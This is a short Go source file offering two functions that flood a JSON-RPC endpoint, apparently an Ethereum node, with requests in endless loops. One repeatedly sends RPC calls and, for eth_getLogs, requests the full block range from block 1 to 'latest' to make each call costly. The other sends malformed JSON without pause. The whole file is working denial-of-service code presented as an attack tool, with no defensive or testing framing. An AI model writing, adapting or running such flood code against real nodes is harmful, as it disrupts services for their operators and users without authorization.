package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
)

// HTTPRPCCallFloodDOS floods the target with expensive HTTP RPC calls
func HTTPRPCCallFloodDOS(target string, method string) error {
	fmt.Printf("Starting HTTP RPC Call Flood DoS on %s\n", target)
	for {
		id := rand.Intn(1000000)
		payload := map[string]interface{}{
			"jsonrpc": "2.0",
			"method":  method,
			"params":  []interface{}{},
			"id":      id,
		}
		if method == "eth_getLogs" {
			// Use a wide block range for DoS
			payload["params"] = []interface{}{map[string]interface{}{"fromBlock": "0x1", "toBlock": "latest"}}
		}
		b, _ := json.Marshal(payload)
		resp, err := http.Post(target, "application/json", bytes.NewReader(b))
		if err != nil {
			fmt.Printf("[!] HTTP error: %v\n", err)
		} else {
			resp.Body.Close()
		}
	}
	return nil
}

// MalformedJSONRPCDOS floods the target with malformed JSON-RPC requests
func MalformedJSONRPCDOS(target string) error {
	fmt.Printf("Starting Malformed JSON-RPC DoS on %s\n", target)
	for {
		b := []byte("{ this is not valid json }")
		resp, err := http.Post(target, "application/json", bytes.NewReader(b))
		if err != nil {
			fmt.Printf("[!] HTTP error: %v\n", err)
		} else {
			resp.Body.Close()
		}
	}
	return nil
}
